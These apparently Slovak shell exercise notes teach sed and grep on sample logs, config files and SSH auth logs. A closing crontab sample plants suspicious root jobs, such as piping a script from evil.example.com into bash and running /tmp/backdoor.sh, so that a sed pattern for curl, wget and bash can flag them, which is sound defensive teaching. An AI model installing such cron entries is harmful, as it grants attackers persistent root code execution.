echo "Mám rád Linux." > subor.txt

cat > subor.txt << EOF
Mám rád Linux.
Linux je výkonný systém.
EOF

sed 's/linux/GNU Linux/I' subor.txt

sed 's/[Ll][Ii][Nn][Uu][Xx]/GNU Linux/g' subor.txt

sed -E 's/linux|Linux|LINUX|LiNuX/GNU Linux/g' subor.txt

LC_ALL=C sed 's/linux/GNU Linux/I' subor.txt

sed '/debug/d' app.log

cat > app.log << EOF
info: server started
debug: loading configuration
info: user logged in
error: database connection failed
debug: retrying connection
info: request completed
EOF

cat > app.log << EOF
2026-07-05 10:01:12 INFO  nginx[1023]: server started on port 8080
2026-07-05 10:01:13 DEBUG nginx[1023]: loading config from /etc/nginx/nginx.conf
2026-07-05 10:01:14 INFO  systemd[1]: nginx service active (running)
2026-07-05 10:01:15 DEBUG app[2045]: initializing cache layer redis://127.0.0.1:6379
2026-07-05 10:01:16 INFO  app[2045]: database connection established
2026-07-05 10:01:17 WARN  app[2045]: high memory usage detected (78%)
2026-07-05 10:01:18 DEBUG app[2045]: retrying connection pool setup
2026-07-05 10:01:19 ERROR app[2045]: database timeout after 3000ms
2026-07-05 10:01:20 INFO  app[2045]: fallback mode enabled
2026-07-05 10:01:21 DEBUG nginx[1023]: request GET /api/users
2026-07-05 10:01:22 INFO  nginx[1023]: response 200 OK
2026-07-05 10:01:23 DEBUG auth[3321]: token validation started
2026-07-05 10:01:24 INFO  auth[3321]: user login successful
2026-07-05 10:01:25 DEBUG auth[3321]: session created
2026-07-05 10:01:26 ERROR app[2045]: failed to write audit log
2026-07-05 10:01:27 INFO  systemd[1]: health check passed
EOF



sed '/^$/d' config.txt

cat > config.txt << EOF
# application config

host=127.0.0.1

port=8080

debug=true

log_level=info


timeout=30

EOF


cat > config.txt << EOF
# =========================
# Application Configuration
# =========================

[server]
host=0.0.0.0
port=8080
workers=4
keep_alive=true

[database]
type=postgresql
host=db.internal.local
port=5432
name=app_db
user=app_user
password=change_me_strong_password
pool_size=20
timeout=30

[redis]
enabled=true
host=127.0.0.1
port=6379
cache_ttl=600

[logging]
level=debug
file=/var/log/app/app.log
format=json
rotate=true
max_size_mb=100

[security]
enable_auth=true
jwt_secret=super_secret_key_change_me
token_expiry_minutes=60
cors_allowed_origins=https://example.com,https://admin.example.com

[features]
registration=true
payments=false
beta_mode=true

[performance]
cache_enabled=true
compression=gzip
rate_limit=100

EOF

sed '/^$/d; /^#/d' config.txt

sed -e '/^$/d' -e '/^#/d' config.txt


sed '/debug/d; /^$/d' app2.log

cat > app2.log << EOF
2026-07-05 09:10:01 INFO  nginx[1021]: server started on port 8080
2026-07-05 09:10:02 DEBUG nginx[1021]: loading configuration file /etc/nginx/nginx.conf
2026-07-05 09:10:03 INFO  systemd[1]: nginx service entered running state

2026-07-05 09:10:04 DEBUG app[2201]: initializing cache layer (redis://127.0.0.1:6379)
2026-07-05 09:10:05 INFO  app[2201]: database connection established successfully

2026-07-05 09:10:06 WARN  app[2201]: high memory usage detected (82%)
2026-07-05 09:10:07 DEBUG app[2201]: retrying connection pool setup

2026-07-05 09:10:08 ERROR app[2201]: database timeout after 3000ms
2026-07-05 09:10:09 INFO  app[2201]: fallback mode activated

2026-07-05 09:10:10 DEBUG nginx[1021]: GET /api/users request received
2026-07-05 09:10:11 INFO  nginx[1021]: response 200 OK

2026-07-05 09:10:12 DEBUG auth[3302]: token validation started
2026-07-05 09:10:13 INFO  auth[3302]: user login successful
2026-07-05 09:10:14 DEBUG auth[3302]: session created

2026-07-05 09:10:15 ERROR app[2201]: failed to write audit log
2026-07-05 09:10:16 INFO  systemd[1]: health check passed
EOF

sed -E 's/[0-9]+/NUM/g' subor.txt
sed -E 's/[[:digit:]]+/NUM/g' subor.txt

cat > subor.txt << EOF
User 123 logged in from 192.168.0.15 at 2026-07-05 10:15:32
Transaction 987654 processed with amount 2500 EUR
Error 500 occurred in module auth after 3 retries
Backup completed in 120 seconds, size 1048576 bytes
Session 44521 started for user 42
API returned status 200 for request id 88991
CPU usage reached 95 percent on server 7
Disk /dev/sda1 has 120000 free blocks out of 500000
User 1001 attempted login 5 times before lock
Order 778899 shipped with tracking number 1234567890
EOF

User NUM logged in from NUM.NUM.NUM.NUM at NUM-NUM-NUM NUM:NUM:NUM
Transaction NUM processed with amount NUM EUR
Error NUM occurred in module auth after NUM retries
Backup completed in NUM seconds, size NUM bytes
Session NUM started for user NUM
API returned status NUM for request id NUM
CPU usage reached NUM percent on server NUM
Disk /dev/sda1 has NUM free blocks out of NUM
User NUM attempted login NUM times before lock
Order NUM shipped with tracking number NUM

sed -E 's/[0-9]{1,3}(\.[0-9]{1,3}){3}/IP/g' access.log

User logged in from 192.168.0.15 at 10:15
Connection from 10.0.0.5 failed
Ping to 8.8.8.8 successful

User logged in from IP at 10:15
Connection from IP failed
Ping to IP successful

cat > access.log << EOF
192.168.0.15 - - [05/Jul/2026:10:01:12 +0200] "GET /index.html HTTP/1.1" 200 5321
10.0.0.5 - - [05/Jul/2026:10:01:13 +0200] "POST /api/login HTTP/1.1" 200 128
172.16.1.23 - - [05/Jul/2026:10:01:14 +0200] "GET /dashboard HTTP/1.1" 302 0
192.168.0.15 - - [05/Jul/2026:10:01:15 +0200] "GET /api/users HTTP/1.1" 200 8421
203.0.113.10 - - [05/Jul/2026:10:01:16 +0200] "GET /api/products HTTP/1.1" 500 231
10.0.0.5 - - [05/Jul/2026:10:01:17 +0200] "GET /static/app.js HTTP/1.1" 200 10234
198.51.100.7 - - [05/Jul/2026:10:01:18 +0200] "POST /api/order HTTP/1.1" 201 64
172.16.1.23 - - [05/Jul/2026:10:01:19 +0200] "GET /health HTTP/1.1" 200 12
192.0.2.44 - - [05/Jul/2026:10:01:20 +0200] "GET /admin HTTP/1.1" 403 721
10.0.0.5 - - [05/Jul/2026:10:01:21 +0200] "DELETE /api/user/123 HTTP/1.1" 200 45
EOF


sed -n '/Failed password/p' auth.log
grep "Failed password" auth.log

Jul 05 10:01:01 server sshd[1201]: Failed password for root from 192.168.0.15 port 22
Jul 05 10:01:02 server sshd[1201]: Accepted password for admin from 10.0.0.5 port 22
Jul 05 10:01:03 server sshd[1201]: Failed password for user from 172.16.1.10 port 22


Jul 05 10:01:01 server sshd[1201]: Failed password for root from 192.168.0.15 port 22
Jul 05 10:01:03 server sshd[1201]: Failed password for user from 172.16.1.10 port 22


cat > auth.log << EOF
Jul 05 10:00:01 server sshd[1201]: Accepted password for admin from 192.168.0.15 port 22 ssh2
Jul 05 10:00:05 server sshd[1201]: Failed password for root from 203.0.113.10 port 22 ssh2
Jul 05 10:00:08 server sshd[1201]: Failed password for invalid user test from 198.51.100.7 port 22 ssh2
Jul 05 10:00:10 server sshd[1201]: Connection closed by 192.168.0.15 port 22 [preauth]
Jul 05 10:00:12 server sshd[1201]: Failed password for root from 203.0.113.10 port 22 ssh2
Jul 05 10:00:15 server sshd[1201]: Accepted publickey for dev from 10.0.0.5 port 22 ssh2
Jul 05 10:00:18 server sshd[1201]: Failed password for admin from 172.16.1.23 port 22 ssh2
Jul 05 10:00:20 server sshd[1201]: Failed password for root from 203.0.113.10 port 22 ssh2
Jul 05 10:00:22 server sshd[1201]: Received disconnect from 198.51.100.7 port 22:11: disconnected by user
Jul 05 10:00:25 server sshd[1201]: Failed password for invalid user oracle from 192.0.2.44 port 22 ssh2
Jul 05 10:00:30 server sshd[1201]: Accepted password for backup from 10.0.0.5 port 22 ssh2
Jul 05 10:00:33 server sshd[1201]: Failed password for root from 203.0.113.10 port 22 ssh2
Jul 05 10:00:36 server sshd[1201]: Failed password for admin from 172.16.1.23 port 22 ssh2
Jul 05 10:00:40 server sshd[1201]: Connection reset by 198.51.100.7 port 22
Jul 05 10:00:45 server sshd[1201]: Failed password for invalid user guest from 192.0.2.44 port 22 ssh2
EOF


sed -n '/ 404 /p' access.log

192.168.0.15 GET /index.html 200
192.168.0.15 GET /missing.html 404
10.0.0.5 GET /api 500
192.168.0.15 GET /style.css 404

192.168.0.15 GET /missing.html 404
192.168.0.15 GET /style.css 404

cat > access.log << EOF
192.168.0.15 - - [05/Jul/2026:10:00:01 +0200] "GET /index.html HTTP/1.1" 200 5321
192.168.0.15 - - [05/Jul/2026:10:00:02 +0200] "GET /login HTTP/1.1" 200 1842
10.0.0.5 - - [05/Jul/2026:10:00:03 +0200] "POST /api/login HTTP/1.1" 200 128
203.0.113.10 - - [05/Jul/2026:10:00:04 +0200] "GET /admin HTTP/1.1" 403 721
198.51.100.7 - - [05/Jul/2026:10:00:05 +0200] "GET /missing-page HTTP/1.1" 404 0
192.168.0.15 - - [05/Jul/2026:10:00:06 +0200] "GET /style.css HTTP/1.1" 200 9123
10.0.0.5 - - [05/Jul/2026:10:00:07 +0200] "GET /api/users HTTP/1.1" 500 231
172.16.1.23 - - [05/Jul/2026:10:00:08 +0200] "GET /not-found HTTP/1.1" 404 0
192.0.2.44 - - [05/Jul/2026:10:00:09 +0200] "POST /api/order HTTP/1.1" 201 64
198.51.100.7 - - [05/Jul/2026:10:00:10 +0200] "GET /favicon.ico HTTP/1.1" 404 0
10.0.0.5 - - [05/Jul/2026:10:00:11 +0200] "GET /dashboard HTTP/1.1" 200 4421
203.0.113.10 - - [05/Jul/2026:10:00:12 +0200] "GET /api/data HTTP/1.1" 500 532
EOF

sed -E 's/[0-9]{1,3}(\.[0-9]{1,3}){3}/X.X.X.X/g' access.log

192.168.0.15 GET /index.html 200
10.0.0.5 POST /api/login 200

X.X.X.X GET /index.html 200
X.X.X.X POST /api/login 200

sed -n '/curl\|wget\|bash/p' /etc/crontab

cat > crontab << EOF
# /etc/crontab: system-wide crontab
# Example structure

SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command

# system maintenance
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

# application jobs
* * * * * root    /usr/bin/php /var/www/app/artisan schedule:run
*/5 * * * * root  /usr/bin/python3 /opt/monitor/healthcheck.py
0 */2 * * * root   /usr/bin/node /opt/api/server.js

# suspicious / security-relevant entries
* * * * * root    curl -s http://evil.example.com/payload.sh | bash
*/10 * * * * root wget http://malicious.example.org/script.sh -O /tmp/update.sh
* * * * * root    bash /tmp/backdoor.sh
30 2 * * * root   /bin/bash /opt/scripts/rotate_logs.sh

# backups
0 3 * * * root    rsync -av /var/www /backup/www
EOF